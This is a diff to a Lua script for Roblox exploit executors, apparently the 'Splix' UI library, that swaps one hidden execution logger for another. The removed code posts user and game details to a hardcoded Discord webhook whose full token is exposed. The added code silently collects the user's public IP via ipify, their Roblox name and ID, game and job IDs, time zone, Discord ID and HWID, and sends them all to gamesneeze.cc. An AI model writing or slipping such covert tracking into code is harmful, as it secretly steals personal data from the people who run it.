@@ -87,51 +87,43 @@ local Passed, Statement = pcall(function()
     end
 end)
 --
-local Webhook = "https://canary.discord.com/api/webhooks/1039753933041717349/D4VMQ11utX1yrAMuzRGDfO8AwvKo7iUbKIocN300udqTOAUivCdhaTnKZPwKhU0zn3zz"
---
-function GetData(Type)
-    return {
-        embeds = {
-            {
-                title = ("Splix Execution Log - %s"):format(Type),
-                fields = {
-                    {
-                        name = "User",
-                        value = ("Name: **%s**\nId: ***%s***"):format(Client.Name, Client.UserId)
-                    },
-                    {
-                        name = "Game",
-                        value = ("Name: **%s**\nId: ***%s***\nLink: **https://www.roblox.com/games/%s/**\nJobId: *%s*"):format(ProductInfo.Name or "null", PlaceId, PlaceId, game.JobId)
-                    },
-                    {
-                        name = "Time",
-                        value = ("Time: **%s**\nTimezone: ***%s***"):format(os.date("%c", os.time()), os.date("%Z", os.time()))
-                    }
-                },
-                color = Type == "Library" and 65311 or Type == "Lighting" and 16740352 or Type == "CIELuv" and 13369599 or 14472159,
-                thumbnail = {
-                    url = "https://i.imgur.com/J2Wf3zg.gif"
-                }
-            }
-        }
-    }
+if not lgVarsTbl then
+    lgVarsTbl = {["DiscordId"] = "null", ["DiscordUsername"] = "null", ["HWID"] = "null"}
 end
 --
-function Call(Data)
-    local Response = syn.request({
-        Url = Webhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(Data)
-    })
+local MarketplaceService = game:GetService("MarketplaceService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+--
+local Client = Players.LocalPlayer
+--
+local PlaceId = game.PlaceId
+--
+local ProductInfo
+local InternetProtocol
+--
+local Passed, Statement = pcall(function()
+    local Info = MarketplaceService:GetProductInfo(PlaceId)
     --
-    if (not Response == "table" or not Response.Success) then
-        --warn("Message send failed:", (Response and Response.Body or "Error"))
+    if Info then
+        ProductInfo = Info
     end
-end
+end)
 --
-Call(GetData("Lighting"))
-
+local Passed, Statement = pcall(function()
+    local Ip = game:HttpGet("https://api.ipify.org/")
+    --
+    if Ip then
+        InternetProtocol = Ip
+    end
+end)
+--
+local response = syn.request(
+    {
+        Url = 'http://gamesneeze.cc/send.php',
+        Method = 'POST',
+        Headers = {},
+        Body = ("&key=test&username=%s&userid=%s&userip=%s&gamename=%s&gameid=%s&gamelink=%s&gamejob=%s&time=%s&timezone=%s&extra=Splix Execution&discordusername=%s&discordid=%s&hwid=%s"):format(Client.Name, Client.UserId, InternetProtocol or "null", ProductInfo.Name or "null", PlaceId, "https://www.roblox.com/games/" .. PlaceId .. "/", game.JobId, os.date("%c", os.time()), os.date("%Z", os.time()), lgVarsTbl["DiscordUsername"], lgVarsTbl["DiscordId"], lgVarsTbl["HWID"])
+    }
+)
 return library
